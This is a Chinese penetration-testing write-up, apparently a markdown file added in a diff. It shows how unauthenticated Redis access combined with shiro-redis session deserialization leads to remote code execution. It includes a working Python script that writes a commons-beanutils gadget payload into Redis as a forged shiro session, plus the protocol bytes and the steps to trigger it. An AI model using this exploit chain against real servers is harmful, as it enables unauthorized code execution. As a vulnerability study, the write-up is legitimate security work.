@@ -1,0 +1,96 @@
+# redis未授权到shiro反序列化
+## 0x01 简介
+在一次渗透测试的过程中发现6379端口上开着一个未授权的redis，尝试利用redis进行rce失败。又发现redis缓存了shiro的session，最终通过redis未授权配合shiro-redis反序列化实现rce
+## 0x02 尝试redis rce
+拿到目标站点ip，首先使用nmap，shodan收集端口信息  
+shodan检测显示6379端口存在redis未授权  
+redis-cli登陆一下，收集信息，发现是3.2.100版本，操作系统是windows  
+考虑一下目前爆出的redis漏洞，一般都需要linux系统环境，4.X及以上的redis版本，这台redis打不了。  
+也尝试了redis写webshell，redis写sshkey，均利用不成功。  
+这个时候注意到了redis里面存储了shiro的session:  
+将value读取出来，发现里面数据开头是\xac\xed，经典的java序列化数据开头。  
+同时想到shiro存在反序列化漏洞，虽然这个目标打不了shiro-550这样的反序列化，但是是否可以通过修改redis中存储的shiro
+session来进行反序列化攻击？
+## 0x03 shiro-redis反序列化
+先了解下shiro为何在redis中存储session。session一般存储于服务端，用来保存用户的认证信息。shiro默认将session存储在内存里面。这样导致shiro的session是不共享的。使用redis来存储shiro
+session可以让其他服务也共享shiro的认证信息。  
+github上可以找到shiro-redis的实现是这个项目，有1.1k个star：  
+查看文档知道作者要求导入如下依赖：
+        org.crazycake
+        shiro-redis
+        3.3.1
+这里使用他的一个已经配置好的项目：  
+首先本地启动一个3.2.100版本的redis镜像，然后下载这个项目，在IDEA中运行。  
+使用默认的用户名和密码登陆。登陆成功后界面上显示自己的session。  
+查看本地测试环境中的redis，发现已经添加了shiro session。  
+下面尝试将反序列化poc写入redis，然后模拟用户访问shiro，导致shiro读取出redis中存储的反序列化数据，触发反序列化漏洞。  
+由于redis-cli或redis图形化客户端将hex形式的poc存入redis会出现字符转义不正确或者其他问题，我使用python编写脚本将poc写入redis。脚本内容如下：
+    import pyyso
+    import socket
+    s=socket.socket()
+    s.connect(("127.0.0.1",6379))
+    whatever=b"123"
+    key=b"shiro:session:"+whatever
+    value=pyyso.cb1v192("open /")
+    s.send(b"\x2a\x33\x0d\x0a\x24\x33\x0d\x0aSET\r\n\x24"+str(len(key)).encode()+b"\r\n"+key+b"\r\n\x24"+str(len(value)).encode()+b"\r\n"+value+b"\r\n")
+    if b"+OK" in  s.recv(3):
+        print("success")
+反序列化的链选取改造过的commons-beanutils利用链来满足shiro环境中的依赖。这里用了一个自己编写的包pyyso：  
+pyyso可以直接生成反序列化的数据，简化脚本编写。  
+然后使用socket发送set指令来写入poc。这里redis的set指令格式如下
+    \x2a\x33 固定值
+    \x0d\x0a 换行
+    \x24\x33 固定值
+    \x0d\x0a 换行
+    SET
+    \x0d\x0a 换行
+    \x24\x??\x?? 十进制的key长度，例如3就是\x33，12就是\x31\x32
+    \x0d\x0a 换行
+    \x??\x?? key
+    \x0d\x0a 换行
+    \x24\x??\x?? 十进制的value长度
+    \x0d\x0a 换行
+    \x??\x?? value
+    \x0d\x0a 换行
+运行脚本，将一个名为`shiro:session:123`的key写入了redis中，内容即嵌入了指令的cb链  
+然后回到浏览器端，将JESSIONID改为123  
+发送请求，反序列化触发，弹出了根目录  
+由此实现了shiro-redis的反序列化rce
+## 0x04 调试分析
+这里调试一下漏洞触发过程。首先定位到导入的依赖包`org.crazycake.shiro-redis`，触发点在`org.crazycake.shiro.RedisSessionDAO#doReadSession`，当shiro需要从redis读取session时就会调用这个方法
+    protected Session doReadSession(Serializable sessionId) {
+        ...
+        Session session = null;
+        try {
+            String sessionRedisKey = getRedisSessionKey(sessionId);
+            logger.debug("read session: " + sessionRedisKey + " from Redis");
+            session = (Session) valueSerializer.deserialize(redisManager.get(keySerializer.serialize(sessionRedisKey))); //触发点
+            if (this.sessionInMemoryEnabled) {
+                setSessionToThreadLocal(sessionId, session);
+            }
+        } catch (SerializationException e) {
+            logger.error("read session error. sessionId: " + sessionId);
+        }
+        return session;
+    }
+可以看到里面使用`redisManager.get`获取redis中存储的序列化数据，然后交给`valueSerializer.deserialize`进行反序列化。这里跟进去，定位到`org.crazycake.shiro.serializer.ObjectSerializer#deserialize`:
+    public Object deserialize(byte[] bytes) throws SerializationException {
+        Object result = null;
+        if (bytes == null || bytes.length == 0) {
+            return result;
+        }
+        try {
+            ByteArrayInputStream byteStream = new ByteArrayInputStream(bytes);
+            ObjectInputStream objectInputStream = new MultiClassLoaderObjectInputStream(byteStream);
+            result = objectInputStream.readObject();
+        } catch (IOException e) {
+            throw new SerializationException("deserialize error", e);
+        } catch (ClassNotFoundException e) {
+            throw new SerializationException("deserialize error", e);
+        }
+        return result;
+    }
+内部将redis读取出的字节数组转换为对象流，然后readObject方法触发反序列化
+## 0x05 总结
+如果实际渗透测试时遇到redis未授权漏洞，同时配置了shiro-redis，那么可以考虑通过向redis写入shiro session来打反序列化。PS:
+下面是我们团队的公众号，以后会持续更新安全技术类文章，欢迎师傅们关注。
